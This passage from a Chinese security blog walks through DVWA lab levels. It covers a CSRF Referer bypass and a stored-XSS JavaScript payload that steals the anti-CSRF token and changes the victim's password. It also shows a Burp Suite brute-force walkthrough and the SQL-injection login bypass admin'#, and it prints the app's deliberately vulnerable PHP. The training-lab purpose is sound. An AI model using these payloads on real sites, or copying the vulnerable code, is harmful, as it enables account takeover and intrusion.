class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这次使用 eregi 函数在 $_SERVER[ ‘HTTP_REFERER’ ] 中匹配 $_SERVER[ ‘SERVER_NAME’ ]，也就是<strong>请求头中的 Referer 字段的值中必须有 Host 字段的值</strong></p><p>Referer 告诉服务器本次访问你从哪个页面来，Host 是访问的服务器主机名</p><p><img src="../img/CSRF/5.png" alt="CSRF"></p><p>这种防御机制企图将用户的访问限制在同一个网站内，从别的 域名/ip 过来的访问都会被阻止</p><p>但如果我们将自己构造的网页名改为<strong>目标网站主机名.html</strong>，就可以轻松绕过这个限制</p><p>把 Low 中写的 test.html 改为 192.168.249.129.html，并将修改的密码改为 789，访问</p><p><img src="../img/CSRF/6.png" alt="CSRF"></p><p>DVWA 的登录密码便被改为了 789</p><br><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/csrf/source/high.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>High 中增加了 token 机制，怎样获取用户 token 是现在需要考虑的问题</p><br><h3 id="失败的尝试"><a href="#失败的尝试" class="headerlink" title="失败的尝试"></a>失败的尝试</h3><p>起初我考虑在 192.168.249.129.html 中包含一个 test.js</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.41 (Debian) Server<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>js 的内容就是访问 CSRF 的页面并获取用户 token</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://192.168.249.129/dvwa/vulnerabilities/csrf/&quot;</span>;</span><br><span class="line">xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;<span class="comment">// 跨转请求携带cookie</span></span><br><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">false</span>);</span><br><span class="line">xmlhttp.send();</span><br><span class="line"><span class="built_in">console</span>.log(xmlhttp.responseText);<span class="comment">// 响应报文输出到控制台</span></span><br></pre></td></tr></table></figure><p>但是当我以受害者的身份访问 192.168.249.129.html 时，请求被拦截了</p><p><img src="../img/CSRF/7.png" alt="CSRF"></p><p>百度了一下，发现是 CORS 机制在捣鬼</p><p><strong>CORS是一种允许当前域的资源（比如 html / js / web service）被其他域的脚本请求访问的机制，通常由于同域安全策略，浏览器会禁止这种跨域请求</strong></p><p>所以单靠 CSRF 已经无法利用漏洞了</p><br><h3 id="结合存储型-XSS-获取-token"><a href="#结合存储型-XSS-获取-token" class="headerlink" title="结合存储型 XSS 获取 token"></a>结合存储型 XSS 获取 token</h3><p>先将 DVWA 难度设为 Medium，在 XSS Stored 分栏的 name 输入框中包含远程 test.js 文件，我的 <a href=https://in1nit1t.github.io/2020/02/27/XSS-Reflected/>这篇文章</a> 有提及 XSS 如何包含远程 js</p><p>然后将难度<strong>重新调回 High</strong>，在自己的服务器上写好 test.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://192.168.249.129/dvwa/vulnerabilities/csrf/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> new_pass = <span class="string">&quot;123456&quot;</span>;<span class="comment">// 设置新密码</span></span><br><span class="line"></span><br><span class="line">req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">req.withCredentials = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">req.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">// 重写onreadystatechange方法</span></span><br><span class="line"><span class="keyword">if</span>(req.readyState == <span class="number">4</span> &amp;&amp; req.status == <span class="number">200</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> text = req.responseText;</span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/user_token\&#x27; value\=\&#x27;(.*?)\&#x27; \/\&gt;/</span>;<span class="comment">//正则匹配token</span></span><br><span class="line"><span class="keyword">var</span> match = text.match(regex);</span><br><span class="line"><span class="keyword">if</span>(flag != <span class="number">0</span>)&#123;</span><br><span class="line">flag = <span class="number">0</span>;<span class="comment">// 设置符号位，防止一直执行</span></span><br><span class="line"><span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> new_url = url + <span class="string">&quot;?user_token=&quot;</span> + token;</span><br><span class="line">new_url += <span class="string">&quot;&amp;password_new=&quot;</span>+ new_pass;</span><br><span class="line">new_url += <span class="string">&quot;&amp;password_conf=&quot;</span>+ new_pass;</span><br><span class="line">new_url += <span class="string">&quot;&amp;Change=Change&quot;</span>;</span><br><span class="line"><span class="comment">// alert(&#x27;Token: &#x27; + match[1]);</span></span><br><span class="line">req.open(<span class="string">&quot;GET&quot;</span>, new_url, <span class="literal">false</span>);</span><br><span class="line">req.send();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">req.open(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">false</span>);</span><br><span class="line">req.send();</span><br></pre></td></tr></table></figure><p>现在就可以在浏览器中作为受害者访问 XSS Stored 的页面，此时密码就被改为 123456 了</p><br><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/csrf/source/impossible.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitise current password input</span></span><br><span class="line"><span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> );</span><br><span class="line"><span class="variable">$pass_curr</span> = mysql_real_escape_string( <span class="variable">$pass_curr</span> );</span><br><span class="line"><span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the current password is correct</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line"><span class="comment">// It does!</span></span><br><span class="line"><span class="variable">$pass_new</span> = stripslashes( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database with new password</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Impossible 给出的解决方案很简单，更改密码时，让用户输入现有的密码，当现有密码正确时才能修改密码</p><p>攻击者如果无法获知受害者当前密码，CSRF 自然就无法利用</p><p>再说了，如果攻击者知晓了受害者当前密码还用费劲玩这些 = =</p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Brute Force</title>
      <link href="/2020/02/27/Brute-Force/"/>
      <url>/2020/02/27/Brute-Force/</url>
      
        <content type="html"><![CDATA[<h2 id="Brute-Force-简介"><a href="#Brute-Force-简介" class="headerlink" title="Brute Force 简介"></a>Brute Force 简介</h2><p>Brute Force，即暴力（破解），是指攻击者利用密码字典，或使用穷举法猜解出用户口令，是最为广泛使用的攻击手法之一</p><br><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><blockquote><p>分析</p></blockquote><p>就给了一个用户登录框，假设账户名已知，为 admin，但不知道其密码，随便输个 123，显示用户名或密码错误</p><p><img src="../img/Brute-Force/1.png" alt="Brute-Force"></p><p>上 burpsuite，密码再输个 123，提交并抓包，<strong>右键 -&gt; Send to Intruder</strong></p><p><img src="../img/Brute-Force/2.png" alt="Brute-Force"></p><p>切换到 <strong>Intruder -&gt; Position</strong> 选项卡，并点击右边的 <strong>Clear</strong>，将其默认设置的一堆变量清除掉（就是那一堆橙色的）</p><p><img src="../img/Brute-Force/3.png" alt="Brute-Force"></p><p>然后拖选中要爆破的地方，点击 <strong>Add</strong></p><p><img src="../img/Brute-Force/4.png" alt="Brute-Force"></p><p>切到 <strong>Payloads</strong> 子选项卡，在 <strong>Payload Options</strong> 里点击 <strong>Load</strong> 添加爆破用的字典</p><p><img src="../img/Brute-Force/5.png" alt="Brute-Force"></p><p>添加完成后，选择菜单栏中的 <strong>Intruder -&gt; Start attack</strong>，等待其将字典中的值都尝试一遍</p><p><img src="../img/Brute-Force/6.png" alt="Brute-Force"></p><p>下方可以看到进度</p><p><img src="../img/Brute-Force/7.png" alt="Brute-Force"></p><p>爆破完成后，点击 <strong>Length</strong> 字段，使其按照 升序/降序 来对 payload 进行排列</p><p>这里的 Length 为响应报文的长度，因为<strong>登录成功和失败返回的页面是不一样</strong>的，所以响应报文的长度也不一样，只要找出长度与众不同的那个，即为 admin 用户的密码</p><p>这里对 Length 进行降序排列，第一个长度为 5327，且响应报文中有欢迎字样，所以 password 为 admin的密码</p><p><img src="../img/Brute-Force/8.png" alt="Brute-Force"></p><p>再拿去 DVWA 的页面中登录，显示登录成功</p><p><img src="../img/Brute-Force/9.png" alt="Brute-Force"></p><br><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/brute/source/low.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get username</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get password</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysql_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line"><span class="comment">// Get users details</span></span><br><span class="line"><span class="variable">$avatar</span> = mysql_result( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Login successful</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Login failed</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>流程大概就是拿用户名和 md5 加密后的密码去数据库里查询，查到结果，且结果条数为 1 就返回登录成功</p><p>但是仔细观察这条 SQL 语句，是不是发现有 SQL 注入的机会呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>因为我们输入的 $pass 被 md5 加密了，所以这个变量不是注入点，​$user 才是注入点，构造 <strong>$user = admin’#</strong>，</p><p>这条 SQL 语句就会变为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;admin&#x27;#&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>后面的 password 就被注释掉了，此时拿去数据库里查询，能查到 admin 这个人，而且只有一条记录的 user 字段值为 admin，于是后面的控制条件也能满足，那是不是就绕过登录了呢</p><p>拿去网页上试一试，果不其然</p><p><img src="../img/Brute-Force/10.png" alt="Brute-Force"></p><br><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/brute/source/medium.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Sanitise username input</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"><span class="variable">$user</span> = mysql_real_escape_string( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitise password input</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = mysql_real_escape_string( <span class="variable">$pass</span> );</span><br><span class="line"><span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysql_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line"><span class="comment">// Get users details</span></span><br><span class="line"><span class="variable">$avatar</span> = mysql_result( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Login successful</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Login failed</span></span><br><span class="line">sleep( <span class="number">2</span> );</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>medium 对输入都用 mysql_real_escape_string 做了处理，SQL注入失效，但仍可以用 burpsuite 爆破，就是会慢一些，因为每次尝试失败都会 